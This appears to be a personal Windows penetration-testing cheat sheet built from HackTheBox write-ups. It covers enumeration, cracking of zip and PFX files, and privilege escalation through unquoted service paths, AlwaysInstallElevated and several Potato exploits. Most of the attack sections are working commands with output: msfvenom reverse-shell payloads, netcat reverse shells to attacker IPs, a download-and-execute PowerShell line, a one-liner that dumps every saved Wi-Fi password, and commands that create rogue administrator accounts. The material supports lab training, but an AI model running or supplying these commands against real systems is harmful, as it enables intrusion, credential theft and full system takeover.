![alt text](https://juggernaut-sec.com/wp-content/uploads/2022/07/image-58.png)

#### Powershell History File

[More](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html)
```
# Get the path of history file default path is C:\Users\{user}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

We can get path using -> Get-PSReadlineOption

# list files in dir

dir C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

# If you didn’t think to check it manually, WinPEAS would also have showed it.

# this file might contains juicy cred or other host connection that were typed in powershell

# EXAMPLE- https://0xdf.gitlab.io/2022/08/20/htb-timelapse.html#shell-as-svc_deploy

```
Alternatively, from a PowerShell prompt we can extract the contents of the PowerShell history file using the following command:
```
cat (Get-PSReadlineOption).HistorySavePath
```

![alt text](https://juggernaut-sec.com/wp-content/uploads/2022/07/image-55.png)



### AD Recycle Bin

[More](https://0xdf.gitlab.io/2020/07/25/htb-cascade.html#ad-recycle)

Active Directory Object Recovery (or Recycle Bin) is a feature added in Server 2008 to allow administrators to recover deleted items just like the recycle bin does for files.

PowerShell command to query all of the deleted objects within a domain:
```
*Evil-WinRM* PS C:\> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```

Get the details of deleted account - in this example TempAdmin account was deleted
```
 Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
 ```

### ENUMERATING FILES
```
- find particilar file
- Nomral Zip file
- protected Zip files
- protected PFX files
- windows 'Cipher' command - Windows encrypted file with Encrypting File System (EFS). 
- Anaylyse file by Exiftool - find creator name etc
- Read/Query .db files (sqlite3)
- Read/Query .mdb files (Microsoft Access Database)
- Read Outlook message format files ie *.msg , with .msg extension using MSGConvert
- Read Outlook email folder file (.pst)
- Read .exe binary using Strings

(below things need to transfer file on windows vm)
- Read / Analyze .exe file using DnsPy in windows (not of use if you cant transfer to wind machine)
- Analyse .exe using procmon from Sys Internals - https://0xdf.gitlab.io/2021/11/06/htb-pivotapi.html#restart-oracleservice-dynamic-reversing

```
**find particilar file**
```

where /r c:\windows todo.txt
where /r c:\ flag.txt
where /r c:\windows ntoskrnl.exe

# Note in PS use where.exe instead of where
   
PS C:\inetpub\streamio.htb\admin> where.exe sqlcmd
        where.exe sqlcmd
        C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE


# File names containing certain keywords

dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt

# Windows powershell equivalent of a recursive linux grep command

dir -recurse *.php | select-string -pattern "database"

```
**Noraml Zip file**

Below example is to open "Access Control.zip"
```
root@kali# unzip -l Access\ Control.zip 
Archive:  Access Control.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
   271360  2018-08-24 01:13   Access Control.pst
---------                     -------
   271360                     1 file
```

```
root@kali# unzip Access\ Control.zip 
```
You can also try 7z (which you can install with apt install p7zip-full)
```
root@kali# 7z x Access\ Control.zip 
```

**Protected Zip File**

List content of zip file
```
unzip -l winrm_backup.zip 
```
Unzip password protected zip file
```
┌──(kali㉿kali)-[~/SMB]
└─$ unzip  Dev/winrm_backup.zip 
Archive:  Dev/winrm_backup.zip
[Dev/winrm_backup.zip] legacyy_dev_auth.pfx password: 
   skipping: legacyy_dev_auth.pfx    incorrect password

# use zip2john to generate a hash that can be brute forced

zip2john winrm_backup.zip > winrm_backup.hash

# Note the hashcat cant crack such hash we can only use john for this

john  --wordlist=~/Downloads/rockyou.txt  winrm_backup.hash 

```

**Pfx File**

A .pfx file typically represents the PKCS#12 format, containing both a public and private key for a user. if you can get access to this file, you’ll be able to get a shell over WinRM or other.

[This post](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file) shows the openssl commands to extract the private key and certificate (public key) from a .pfx file.
```
openssl pkcs12 -in [yourfile.pfx] -nocerts -out [drlive.key]
```

However in our case we are prompted for a password
```
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
Enter Import Password:
Mac verify error: invalid password?
```
We can use `pfx2john.py` to generate a hash for this which John can crack
```
pfx2john legacyy_dev_auth.pfx > pfx.hash
```
```
john  --wordlist=~/Downloads/rockyou.txt  pfx.hash 
```
Enter the password and a passphrase which you can remember
```
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```
Dump the certificate
```
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password:
```
Now both files exist
```
└─$ ls legacyy_dev_auth.*
legacyy_dev_auth.crt  legacyy_dev_auth.key  legacyy_dev_auth.pfx
```
Now we can use this public key Certificate and the private Key with Winrm to get shell
```
# -S - Enable SSL, because I’m connecting to 5986;
# -c legacyy_dev_auth.crt - provide the public key certificate
# -k legacyy_dev_auth.key - provide the private key
# -i timelapse.htb - host to connect to

evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```

**Cipher**
https://0xdf.gitlab.io/2019/08/17/htb-helpline-kali.html#enumeration

**ExifTool**

In This example we got username
```
└─$ exiftool 2020-01-01.pdf 
ExifTool Version Number         : 13.10
File Name                       : 2020-01-01.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2025:03:31 04:53:40-04:00
File Access Date/Time           : 2025:03:31 04:53:40-04:00
File Inode Change Date/Time     : 2025:03:31 04:55:15-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
```

**query .db files**

Example - SQLite https://0xdf.gitlab.io/2020/07/25/htb-cascade.html#auditdb
```
root@kali# sqlite3 Audit.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
DeletedUserAudit  Ldap              Misc

sqlite> select * from DeletedUserAudit;
6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local

sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local

sqlite> select * from Misc;
```
**.mdb files (Microsoft Access Database)**

```
root@kali# file backup.mdb 
backup.mdb: Microsoft Access Database
```
Use `mdbtools`. Install with `apt install mdbtools`.

list the tables:
```
root@kali# mdb-tables backup.mdb 
```
use a bash loop to go over the tables, and see which have data
```
root@kali# mdb-tables backup.mdb | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export backup.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done
acc_timeseg: 2
acc_wiegandfmt: 12
ACGroup: 6
action_log: 25
areaadmin: 4
auth_user: 4
DEPARTMENTS: 6
deptadmin: 8
LeaveClass: 4
LeaveClass1: 16
personnel_area: 2
TBKEY: 4
USERINFO: 6
ACUnlockComb: 11
AttParam: 20
auth_group: 2
SystemLog: 2
```
Looking through the data in these tables, I see the auth_user table. It has a password field:
```
root@kali# mdb-export backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

**Outlook message format files**

https://0xdf.gitlab.io/2021/11/06/htb-pivotapi.html#smb-enumeration

We found .msg files from SMB which is basically outlook format
```
smb: \HelpDesk\> prompt off
smb: \HelpDesk\> mget *
getting file \HelpDesk\Restart-OracleService.exe of size 1854976 as Restart-OracleService.exe (870.1 KiloBytes/sec) (average 870.1 KiloBytes/sec)
getting file \HelpDesk\Server MSSQL.msg of size 24576 as Server MSSQL.msg (64.5 KiloBytes/sec) (average 748.0 KiloBytes/sec)
getting file \HelpDesk\WinRM Service.msg of size 26112 as WinRM Service.msg (66.1 KiloBytes/sec) (average 655.3 KiloBytes/sec)
```
```
oxdf@parrot$ file Server\ MSSQL.msg
Server MSSQL.msg: CDFV2 Microsoft Outlook Message
```
[MSGConvert](https://www.matijs.net/software/msgconv/) - we will use MSGConvert to read this on linux

On any Unix-like system with a reasonably new Perl installed, you can install the Email::Outlook::Message module by executing the following:
```
cpan -i Email::Outlook::Message
```

On recent versions of Debian and Ubuntu, you can install msgconvert simply by executing the following:

```
sudo apt-get install libemail-outlook-message-perl
```

Now I’ll run sudo msgconvert [msg file], and it will create .eml files for each input.
```
oxdf@parrot$ msgconvert *.msg
```
The resulting files can be read as is

**Outlook email folder file (.pst)**

"Access Control.pst"
```
root@kali# file Access\ Control.pst 
Access Control.pst: Microsoft Outlook email folder (>=2003)
```
Like the database, there are many ways to get to this data. I’ll convert it to mbox format using readpst (`apt install readpst`):
```
root@kali# readpst Access\ Control.pst
```



## Windows Miscellaneous
```
# Network Enumeration

- Hosts present in host file
- Available network interfaces
- Network Shares
- Netowrk Route (Routing Table)
- ARP (Address Resolution Protocol) cache table for all available interfaces.
- Active network connections
- Firewall rules
- List saved Wifi
- Oneliner to extract all wifi passwords

# Services Enumeration

- Scheduled Tasks (scheduled bydefult and by task schedular)
- Processes running
- Started services and their state
- Service name,pathname,displayname,startmode

# Sensitive Information Enumeration

- Grep the registry for keywords, in this case "password".
- stored credentials

# Others
- Installed Drivers
```

**Network info enumeration**
```
- Hosts present on host file
    - `type C:\Windows\System32\drivers\etc\hosts`

- Available network interfaces
    - `ipconfig / all`

- Shares
    - Get a list of computers `net view`
    - Check current shares `net shares`
    - List shares of a computer `net view \\computer /ALL`
    - Mount the share locally `net use x: \\computer\share`

- Routing Table
    - `route print`

- ARP (Address Resolution Protocol) cache table for all available interfaces.
    - `arp -A`

- Active network connections 
    - `netstat -ano`

- Firewall rules
    - `netsh firewall show state`
    - `netsh firewall show config` 
        - use `netsh firewall ?`  for more options

- Wifi info

    - List saved Wifi
        - `netsh wlan show profile`

    - To get the clear-text password use
        - `netsh wlan show profile <SSID> key=clear`

    - Oneliner to extract all wifi passwords
        - `cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*`
```
**Services Enumeration**
```
- Scheduled Tasks (scheduled bydefult and by task schedular)
    - `schtask`
        - `schtasks /query /fo LIST /v`

- Processes running
    - `tasklist /SVC`

- Started services and their state
    - `net start`
    - `sc query`
        - `sc qc <service_name>`

- Service name,pathname,displayname,startmode

    - `wmic service get name,pathname,displayname,startmode`


    - `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`
`
/i means ignore the case
/v means except <this argument> find others.
```
**Sensitive Information Enumeration**
```
- Grep the registry for keywords, in this case "password".
    - `reg query HKLM /f password /t REG_SZ /s`
    - `reg query HKCU /f password /t REG_SZ /s`

- Currently stored credentials
    - `cmdkey /list`
```
**Others**
```
- Installed Drivers
    - `DRIVERQUERY`
        - `DRIVERQUERY | findstr "<your search>`
```

# PRIVILEGE ESCALATION

### WinPeas

[WinPeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20250424-d80957fb)

Download and upload winPEASx64.exe or winPEASx86.exe as per architecture and run

### Unquoted Service Path

[More](https://www.hackingarticles.in/windows-privilege-escalation-unquoted-service-path/)

If the path to the service binary is not enclosed in quotes and contains white spaces, As a result, a local user will be able to elevate the privilege to administrator privilege shell by placing an executable in a higher level directory within the path.

For example, a service uses the unquoted path:
```
C:\Program Files\Ignite Data\Vuln Service\file.exe
```
The system will read this path in the following sequence from 1 to 4 to trigger malicous.exe through a writeable directory.
```
C:\Program.exe

C:\Program Files\Ignite.exe

C:\Program Files\Ignite Data\Vuln.exe

C:\Program Files\Ignite Data\Vuln Service\file.exe
```

**Exploit**

[EXAMPLE](https://www.hackingarticles.in/windows-privilege-escalation-unquoted-service-path/)

1. Find the unquoted service path using any (Wmic or PowerUp.ps1 or WinPeas)

Using Wmic
```
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
Using [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
```
wget http://192.168.1.3/PowerUp.ps1 -o PowerUP.ps1
powershell –ep bypass
Import-Module .\PowerUp.ps1
Get-UnquotedService
```
Using Winpeas
```
winPEASx64.exe quiet servicesinfo
```

![alt text](https://blogger.googleusercontent.com/img/a/AVvXsEgq4iOU7D0Q3XwnwOKQHnh1KlNG_EkcHgT4ObZG68KGPwwuWorOaymuu23sC-84FqRh_Vbqw9-0M7qylMH7r8uzgCRiQJjRVwbxCs3_P5OmCf6DWQlgNQOyALXcJydPfPrFUj_xHMj044ZCoG1cfNOurrPpMJgT_GuTMXLKJ13vqRqjC1FPZLw71spnjQ=s16000)

2. Check Permissions on folder: We need any of the three permission (basically write permission) on the folder in which unquoted service is there
(F) Full Control
(M) Modify
(W) Write

Check Permission using icacls for example if we found "C:\Program Files\Ignite Data\Vuln Service\file.exe"
```
icacls "C:\Program Files"
icacls "C:\Program Files\Ignite Data"
icacls "C:\Program Files\Ignite Data\Vuln Service"
```

3. As we know unquoted folder name is Vuln Service thus we will create a file with the name Vuln.exe with the help of msfvenom.
```
msfvenom –p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 –f exe > Vuln.exe
python –m SimpleHTTPServer 80
```
4. Transfer the Vuln.exe onto the target machine’s “Ignite Data” folder. 
```
powershell wget http://192.168.1.3/Vuln.exe -o Vuln.exe
```
5. Restarting the service will result in a reverse connection. (note that service name in this case is vulns)
```
net start vulns
```
6. Get a reverse connection in the new netcat session as NT Authority \system

![alt text](https://blogger.googleusercontent.com/img/a/AVvXsEhspTpaqNDpSYZeLSihUuAEJ6l-cL2PROsFZ4G7IP7v3CTQfTAUkMWljTgpkDCehAkERv5gEmYyyyW61_GeQwTsJhvENlMpMSJVR7AxUVfB8XMMgCdXkCkRo2QRPUEkNrRfP5G8emVbdqHOPZXxuX-JDYCbZl9BX3l4I8S830pKSLh8xRbJ3CQyW2KGwA=s16000)

### AlwaysInstallElevated

[MORE](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/)

[EXAMPLE](https://0xdf.gitlab.io/2021/08/07/htb-love.html#alwaysinstallelevated)

“AlwaysInstallElevated” is a setting in Windows policy that permits the Windows Installer packages (.msi files) to be installed with administrative privileges. This configuration can be adjusted through the Group Policy Editor (gpedit.msc). When activated, it enables any user, even those with restricted privileges, to install software with elevated rights. This option is available under both the Computer Configuration and User Configuration sections within the Group Policy.

we can find out if this is enabled by querying registry keys `HKEY_CURRENT_USER (HKCU)` and `HKEY_LOCAL_MACHINE (HKLM)`

`HKCU` holds user-specific configuration data like desktop settings and application preferences.
`HKLM` contains system-wide settings such as hardware configurations and software installations that apply universally to all users on the computer.

The misconfiguration can be checked by running the registry query commands. 
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```
if the value of 0x1 is = 1 which means its enabled

![alt text](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgt9K_W2I_jLcCWJr2gfhRZM8VzXMjsiX7nr_dXMgVUp3qVbvJ7BnwRsrMrwm3LlFUlHlcMk7rpASU9WuZFyrig5DEM9VRxSPyROcP5k9zVTmvQwsxXXen6yo0YfBsZGEiwUQVMaPm9bh-V5AyRGFBbPTzLLpAzpwviR7vvkj2gN7ad0zLFD5WLZzck0hw0/s16000/6.png)


We can also find this using `Winpeas`

![alt text](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgiHH3ZTHogIqY4ts4WX_K5-a227CdKgFwuPNLhBOsjjuCxVf6FvwzkyzKsPpcOs-LBiYvUuWRm6nB1yIW_0h2JvPhjuheMSWD6Hptvk4o-WYfxCt5OB2JYT3QRLjnlPBuGibL3NvdPxMcfQy2vdEOCNZ85rhbOfrLCSTYURDb-nEeTCz5wJKuVUfZ9pvpK/s16000/9.png)
![alt text](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhKPjuXPgRKb_5hfssLjM58aLLd6Xhs2lSUzXPizQ6B6VVZXca5YFupa7-bhl_eE41GdoEFp44gZ5gDCNtUVIbjiyJmhFnFKNM6taTqbyIOB0fsBbyiItzboM0GIImaIP5bhq0fUXm_7XlLTOFt9b81S1naVd8S_s-TLFA87mtNhXXAI1zgr67BJ_gXyshv/s16000/10.png)


2 Ways to exploit

1. Get Privileged Revese Shell: Generate msi which gives us reverse shell as Administrator when runs with elevated privilege
2. Add user to Local Admin group: Generate msi which adds user itself to local Administrator group with elevated privilege

**1st way - Get Privileged Revese Shell**
```
1. Generate the .msi file payload using msfvenom 
2. Transfer it to target
3. Install it using the msiexec command line utility
4. Make sure to start a listener at port mentioned while generating msfvenom payload
5. Observe that once the package is executed a reverse shell is obtained with NT Authority\system privileges.
```
1. Generate the .msi file payload using msfvenom 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.31.141 lport=443 -a x64 --platform windows -f msi -o ignite.msi
```
2. Transfer it to target
```
powershell wget 192.168.31.141/ignite.msi -o ignite.msi
```
3. Install it using the msiexec command line utility
```
msiexec /quiet /qn /i ignite.msi
```
4. Get shell on listerner

![alt text](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQvHPrQEClCoqoCq32YIpGydxfHN4iNu56l15qH1yri6LUl3HoWaTJ7hsizJbfmWRlyIxwor77q10Cn-8luT30eM94d7n_Sp9ms7VRZymtgxBRi9S4GA23zhmtGQvFC8MGNZ9jP6DTyY_98R1wIiDQX50FaVAbkhnwVQJorBXZH8yjvsh7LSn8tAP18cNv/s16000/13.png)


**2nd way - Add user to Local Admin group**
```
1. Generate the .msi file payload using msfvenom 
2. Transfer it to target
3. Install it using the msiexec command line utility
5. Observe that controlled user is now part of local Administrator group
```
1. Generate the .msi file payload using msfvenom 
```
msfvenom -p windows/exec CMD='net localgroup administrators raaz /add' -f msi > adduser.msi
```
2. Transfer it to target
```
powershell wget 192.168.31.141/adduser.msi -o adduser.msi
```
3. Install it using the msiexec command line utility
```
msiexec /quiet /qn /i adduser.msi
```
5. Observe that controlled user is now part of local Administrator group

![alt text](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEipVKUEUwWt1ctjbGCQtBjtZkgcSMPbjcbvX2hSJAgICu5ex649lmJldGS-fQOhb_TVpKHuii112Sz_q3FttUImnd5Tj7p8h0xJlEsdD-4DObV-o4CxzCyOqI3quyFumgwdJZvxWr1uoBlU991Mm7_FxhO-LBru9iibqHEz6AV-G1iPBQEA0mP5v5Uq7_O1/s16000/16.png)


**Automated Exploitation using Metasploit**

![alt text](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhcAC_pMMbxg_BBk6m52IFlpLV_S7o-q9G-LBelKgUhIqZSY1upr2LwEXyfavJa85qcC3DQPx-tARFClZvnP9dF_431jquv9zcU0CJDFtvkc2QRx33h7eemHMyLU63WrHB8Dfruxcjd7QjqA-qNp_JhKVkbnz-6i78qW5iaTdDnzPMTDL6fvFDbJgxQOQT3/s16000/17.png)

### SeImpersonatePrivilege

There are many attacks from 2016 to today made to exploit impersonations, these are called `Potato Attacks`.

```
# Good references

https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all#bkmrk-juicypotatong
https://0xdf.gitlab.io/2021/11/08/htb-pivotapi-more.html#seimpersonate
https://jlajara.gitlab.io/Potatoes_Windows_Privesc
https://github.com/bodik/awesome-potatoes
```

Many of these are patched by Microsoft, however some can still be tried on specific windows versions 

1. `JuicyPotatoNG`        (Windows 10 / Windows Server 2019)
2. `PrintSpoofer`         (Windows 10 / Windows Server 2019)
3. `Rogue Potato`         (Windows 10 / Server 2019 version 1809 – present )
4. `GodPotato`            (Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11)
5. `EfsPotato`            try this ig GodPateto dosent

********************************************************************************************

**EfsPotato**
```
1. upload EfsPotato.cs and compile it using the csc.exe 
2. check command execution
3. upload nc64.exe and get shell
```
1. upload EfsPotato.cs and compile it using the csc.exe 
```
PS C:\programdata> wget 10.10.14.6/EfsPotato.cs -outfile EfsPotato.cs
PS C:\programdata> C:\Windows\Microsoft.net\framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618

Microsoft (R) Visual C# Compiler version 4.8.4161.0                            
for C# 5                                                                       
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. 
For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
```
2. check command execution
```
PS C:\programdata> .\EfsPotato.exe 'whoami'
.\EfsPotato.exe 'whoami'
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privilege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=19809ff0)
[+] Get Token: 912
[!] process with pid: 2396 created.
==============================
nt authority\system  
```
3. upload nc64.exe and get shell
```
PS C:\programdata> .\EfsPotato.exe '\programdata\nc64.exe 10.10.14.6 444 -e powershell'
.\EfsPotato.exe '\programdata\nc64.exe 10.10.14.6 444 -e powershell'
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privilege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=19b26f30)
[+] Get Token: 888
[!] process with pid: 4024 created.
==============================
```
```
oxdf@hacky$ rlwrap -cAr nc -lnvp 444
Listening on 0.0.0.0 444
Connection received on 10.10.11.24 49870
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\programdata> whoami
nt authority\system
```

**GodPotato**
https://owlhacku.com/flight-write-up/

[GodPotato](https://github.com/BeichenDream/GodPotato?tab=readme-ov-file)

[Compiled exe](https://github.com/BeichenDream/GodPotato/releases)

After Uploading the GodPotato Executable onto the system we are able to use it, and we can run the executable as “nt authority\system”.

```
1. upload exe to target
2. try command execution using exe
3. create a new user and add it to local administrator group
4. connect using it as administrator using psexec
```

```
.\GP.exe -cmd "cmd /c whoami"
```

![alt text](https://owlhacku.com/wp-content/uploads/2024/06/Pasted-image-20240408231002.png)

With this functionality and these privileges we can create a new user and put them in the local administrators group.
```
.\GP.exe -cmd "cmd /c net user /add Jarrod Password123"

.\GP.exe -cmd "cmd /c net localgroup administrators Jarrod /add"
```
![alt text](https://owlhacku.com/wp-content/uploads/2024/06/Pasted-image-20240408232708.png)

![alt text](https://owlhacku.com/wp-content/uploads/2024/06/Pasted-image-20240408232808.png)

![alt text](https://owlhacku.com/wp-content/uploads/2024/06/Pasted-image-20240408232828.png)

All that is left to do now is connect to the host. We can use psexec to accomplish this.

```
impacket-psexec Jarrod:password123@flight.htb
```

![alt text](https://owlhacku.com/wp-content/uploads/2024/06/Pasted-image-20240408232921.png)



**JuicyPotatoNG**

https://0xdf.gitlab.io/2022/10/15/htb-perspective.html#unintended-root-via-potato

[Compiled exe](https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1)

```
1. Upload exe to target
2. Verify if target can ping our attacker host using exe with cmd.exe
    - if it fails due to COM server port issue, try finding diffrent port open in windows firewall and use it
3. upload nc.exe and run it for reverse shell
4. get the shell
```
1. Upload exe to target
```
PS C:\programdata> wget 10.10.14.6/JuicyPotatoNG.exe -outfile jp.exe
```
2. Verify if target can ping our attacker host using exe with cmd.exe
```
PS C:\programdata> .\jp.exe -t * -p "cmd.exe" -a "/c ping 10.10.14.6" 


         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
[-] The privileged process failed to communicate with our COM Server :( Try a different COM port in the -l flag. 
```
find diffrent port using -s flag
```
PS C:\ProgramData> .\jp.exe -s


         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Finding suitable port not filtered by Windows Defender Firewall to be used in our local COM Server port.
[+] Found non filtered port: 80
[+] Found non filtered port: 443
[+] Found non filtered port: 5985
```
Again run and verify tcpdump for ICMP ping
```
PS C:\programdata> .\jp.exe -t * -p "cmd.exe" -a "/c ping 10.10.14.6" -l 443
```
```
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
```
Once we confirm ping lets move for shell

3. upload nc.exe and run it for reverse shell
```
PS C:\programdata> wget 10.10.14.6/nc64.exe -outfile nc.exe
```
```
PS C:\programdata> .\jp.exe -t * -p "cmd.exe" -a "/c C:\\programdata\\nc.exe -e cmd 10.10.14.6 443" -l 443
```
4. get the shell
```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.151 49699
Microsoft Windows [Version 10.0.17763.2803]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

**RoguePotato**

https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html#prep

Prerequisite:
- The machine under your control should be able to access RPC port 135 on your attacker host

RoguePotato tells Windows to connect to our attacker host on 135, where we are running socat through which we will pipe it back to port of our choice on target.

[Compiled exe](https://github.com/antonioCoco/RoguePotato/releases/tag/1.0)
```
0. Grab a copy of RoguePotato.exe and upload it to Remote, staging out of c:\programdata
1. Start socat on our Kali box listening on TCP 135 and redirecting back to Remote on TCP 9999
2. Verify if target host is able to ping our attaker host by ICMP ping in tcpdump on our kali.
3. We will Upload `Nishang Reverse Shell` (Invoke-PowerShellTcp.ps1), and start a listener simultaneously
4. get the shell
```


0. Grab a copy of RoguePotato.exe and upload it to Remote, staging out of c:\programdata

1. Start socat on our Kali box listening on TCP 135 and redirecting back to Remote on TCP 9999
```
root@kali# socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
```
2. Verify if target host is able to ping our attaker host by ICMP ping in tcpdump on our kali.
```
PS C:\programdata> .\RoguePotato.exe -r 10.10.14.9 -e "cmd.exe /c ping 10.10.14.9" -l 9999
```
```
root@kali# tcpdump -i tun0 icmp
```
If we have pings from remote in tcpdump we can proceed for shell

[Nishang reverse shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

3. We will Upload `Nishang Reverse Shell` (Invoke-PowerShellTcp.ps1), and start a listener simultaneously

```
PS C:\programdata> .\RoguePotato.exe -r 10.10.14.9 -e "powershell -c iex( iwr http://10.10.14.9/shell.ps1 -UseBasicParsing )" -l 9999
```

```
root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.180 - - [08/Sep/2020 07:48:58] "GET /shell.ps1 HTTP/1.1" 200 -
```

```
root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.180.
Ncat: Connection from 10.10.10.180:49728.
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\programdata>whoami
nt authority\system
```

**PrintSpoofer**

https://0xdf.gitlab.io/2021/11/06/htb-pivotapi.html#shortcut-2

[Compiled exe](https://github.com/itm4n/PrintSpoofer/releases)

```
1. upload exe to target
2. check command execution using exe
2. upload nc64.exe to target
3. get the shell
```
```
c:\programdata\PrintSpoofer64.exe -c "cmd /c whoami >\programdata\output
```
```
c:\programdata\PrintSpoofer64.exe -c "c:\programdata\nc64.exe 127.0.0.1 9999 -e cmd"
```
```
oxdf@parrot$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37126
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>whoami
licordebellota\pivotapi$
```


### SeManageVolumePrivilege

https://0xdf.gitlab.io/2021/11/08/htb-pivotapi-more.html#sebackupvolume

### SeBackupPrivilege & Backup Operators group
A user with this privilege can create a full backup of the entire system, including sensitive files like the `Security Account Manager (SAM)` and the Active Directory database `“NT Directory Services. Directory Information Tree” (NTDS.dit).`

Then, with that full backup, we can extract the hashes from these files to crack them offline or perform a Pass-the-Hash (PTH) attack to elevate our obtained shell.

for exploit, we need to Dump the Domain Credentials to a file. For this, we will use `DiskShadow (a Windows signed binary)`, Diskshadow creates copies of a currently used drive.

three (3) different techniques to achieve that
[More](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)

```
Method 1 - Diskshadow & Robocopy

